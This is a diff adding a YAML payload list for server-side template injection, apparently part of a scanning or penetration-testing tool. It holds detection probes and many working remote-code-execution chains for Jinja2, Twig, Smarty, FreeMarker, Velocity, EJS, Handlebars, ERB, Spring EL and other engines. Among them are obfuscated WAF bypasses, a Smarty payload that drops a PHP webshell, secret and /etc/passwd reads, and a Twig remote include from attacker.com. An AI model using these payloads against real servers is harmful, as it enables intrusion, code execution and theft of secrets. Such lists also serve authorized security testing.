@@ -1,0 +1,430 @@
+﻿# payloads/ssti.yaml
+# Server-Side Template Injection payloads
+
+# ─── DETECTION PROBES ─────────────────────────────────────────────────────────
+- payload: "{{7*7}}"
+  description: "SSTI math probe - Jinja2/Twig/Smarty - expects 49"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "${7*7}"
+  description: "SSTI math probe - FreeMarker/Velocity/Groovy - expects 49"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "#{7*7}"
+  description: "SSTI math probe - Ruby ERB/Thymeleaf - expects 49"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "*{7*7}"
+  description: "SSTI math probe - Spring Expression Language"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "<%=7*7%>"
+  description: "SSTI math probe - ERB/EJS - expects 49"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "{{7*'7'}}"
+  description: "SSTI Jinja2 vs Twig differentiation - Jinja2=49 Twig=7777777"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "${{7*7}}"
+  description: "SSTI probe for Groovy/Spring EL"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "<%= 7 * 7 %>"
+  description: "ERB explicit whitespace math probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "@(7*7)"
+  description: "Razor/ASP.NET SSTI probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "{{7**7}}"
+  description: "Jinja2 exponentiation probe - expects 823543"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+# ─── JINJA2 RCE ───────────────────────────────────────────────────────────────
+- payload: "{{config}}"
+  description: "Jinja2 config object dump"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "{{config.items()}}"
+  description: "Jinja2 config items dump"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "{{settings.SECRET_KEY}}"
+  description: "Jinja2 Django settings secret key leak"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{''.__class__.__mro__[2].__subclasses__()}}"
+  description: "Jinja2 MRO subclass chain enumeration"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
+  description: "Jinja2 Popen RCE via subclass index (id command)"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+  description: "Jinja2 request.application globals os.popen RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{lipsum.__globals__['os'].popen('id').read()}}"
+  description: "Jinja2 lipsum globals os RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+  description: "Jinja2 cycler RCE via globals os"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+  description: "Jinja2 joiner RCE via globals os"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+  description: "Jinja2 namespace RCE via globals os"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
+  description: "Jinja2 self TemplateReference RCE chain"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"
+  description: "Jinja2 for-loop subclass warning module RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}"
+  description: "Jinja2 builtins eval RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── JINJA2 WAF BYPASSES ──────────────────────────────────────────────────────
+- payload: "{{''.join(['__','cl','ass__'])}}"
+  description: "Jinja2 string join to bypass __class__ filter"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
+  description: "Jinja2 attr filter hex escape WAF bypass RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{request|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(396)('id',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)}}"
+  description: "Jinja2 attr-only chain RCE for WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{%with a=request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')%}{%with b=a|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')%}{{b|attr('popen')('id')|attr('read')()}}{%endwith%}{%endwith%}"
+  description: "Jinja2 with-block hex escape RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── MAKO RCE ────────────────────────────────────────────────────────────────
+- payload: "${__import__('os').popen('id').read()}"
+  description: "Mako Python import os popen RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%\nimport os\nx=os.popen('id').read()\n%>${x}"
+  description: "Mako module block import RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "${self.module.cache.util.os.system('id')}"
+  description: "Mako self module cache util os RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%!import os%>${os.popen('id').read()}"
+  description: "Mako module-level import RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── TWIG RCE ────────────────────────────────────────────────────────────────
+- payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  description: "Twig _self.env registerUndefinedFilterCallback RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{['id']|filter('system')}}"
+  description: "Twig filter system RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{['id','']|sort('system')}}"
+  description: "Twig sort function callback RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{app.request.server.get('SERVER_NAME')}}"
+  description: "Twig app.request server variable leak"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "{{dump(app)}}"
+  description: "Twig dump app object"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "{{_self.env.setCache('ftp://attacker.com/x')}}{%set _cache=_self.env.getTemplateClass('x')%}"
+  description: "Twig setCache SSRF/RCE via remote include"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── SMARTY RCE ──────────────────────────────────────────────────────────────
+- payload: "{php}echo system('id');{/php}"
+  description: "Smarty {php} block RCE (Smarty 2.x)"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']);?>\",self::clearConfig())}"
+  description: "Smarty writeFile webshell drop RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{system('id')}"
+  description: "Smarty function call RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{literal}{/literal}{php}system('id');{/php}"
+  description: "Smarty literal escape + php block RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{if system('id')}{/if}"
+  description: "Smarty if-block system call RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{'id'|shell_exec}"
+  description: "Smarty pipe modifier shell_exec RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── FREEMARKER RCE ──────────────────────────────────────────────────────────
+- payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+  description: "FreeMarker Execute class RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: '${freemarker.template.utility.Execute?new()("id")}'
+  description: "FreeMarker Execute new() RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: '<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")><#assign dwf=owc.newInstance()><#assign ec=dwf("freemarker.template.utility.Execute")>${ec("id")}'
+  description: "FreeMarker classloader chain RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}"
+  description: "FreeMarker class location disclosure"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+# ─── VELOCITY RCE ────────────────────────────────────────────────────────────
+- payload: '#set($x=$class.forName("java.lang.Runtime"))#set($rt=$x.getMethod("getRuntime").invoke($x))#set($cmd=$rt.exec("id"))#set($is=$cmd.getInputStream())#set($isr=new java.io.InputStreamReader($is))#set($br=new java.io.BufferedReader($isr))$br.readLine()'
+  description: "Velocity Runtime.exec RCE full chain"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: '#set($s="")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))#set($process=$runtime.exec("id"))#set($inputStream=$process.getInputStream())#set($inputStreamReader=new java.io.InputStreamReader($inputStream))#set($bufferedReader=new java.io.BufferedReader($inputStreamReader))$bufferedReader.readLine()'
+  description: "Velocity string class forName Runtime RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: '$class.forName("java.lang.System").getField("out").get(null).println($class.forName("java.lang.Runtime").getRuntime().exec("id").text)'
+  description: "Velocity System.out Runtime exec"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── PUG/JADE RCE ────────────────────────────────────────────────────────────
+- payload: "#{root.process.mainModule.require('child_process').execSync('id').toString()}"
+  description: "Pug root.process RCE via child_process"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "- var x = root.process.mainModule.require('child_process').execSync('id').toString()\n= x"
+  description: "Pug variable assignment RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "- global.process.mainModule.require('child_process').exec('id',(a,b,c)=>res.end(b))"
+  description: "Pug global.process async RCE with response"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── EJS RCE ─────────────────────────────────────────────────────────────────
+- payload: "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+  description: "EJS global.process child_process RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%- global.process.mainModule.require('child_process').execSync('id') %>"
+  description: "EJS unescaped output RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: '<%= process.binding("spawn_sync").spawn({file:"/bin/sh",args:["/bin/sh","-c","id"],stdio:[{type:"pipe"},{type:"pipe"},{type:"pipe"}]}).output[1].toString() %>'
+  description: "EJS process.binding spawn_sync raw syscall RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── HANDLEBARS RCE ──────────────────────────────────────────────────────────
+- payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
+  description: "Handlebars constructor chain RCE (full chain)"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{#with this.constructor.prototype}}{{#each this}}{{/each}}{{/with}}{{#with (lookup . 'constructor')}}{{#each this}}{{/each}}{{/with}}"
+  description: "Handlebars constructor prototype probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+# ─── ERB (Ruby) RCE ──────────────────────────────────────────────────────────
+- payload: "<%= system('id') %>"
+  description: "ERB Ruby system() RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%= `id` %>"
+  description: "ERB Ruby backtick exec RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%= IO.popen('id').read %>"
+  description: "ERB IO.popen RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%= require 'open3'; Open3.capture2('id')[0] %>"
+  description: "ERB Open3 capture2 RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%= File.read('/etc/passwd') %>"
+  description: "ERB File.read LFI"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "<%- system('id') -%>"
+  description: "ERB dash trim RCE variant"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── SPRING EL RCE ───────────────────────────────────────────────────────────
+- payload: "*{T(java.lang.Runtime).getRuntime().exec('id')}"
+  description: "Spring EL T() Runtime.exec RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}"
+  description: "Spring EL T() exec with shell array RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}"
+  description: "Spring EL IOUtils toString Runtime exec obfuscated RCE"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── NUNJUCKS RCE ────────────────────────────────────────────────────────────
+- payload: "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}"
+  description: "Nunjucks range.constructor RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "{{loop.index.__proto__.constructor.constructor('return process.env')()}}"
+  description: "Nunjucks prototype chain env dump"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
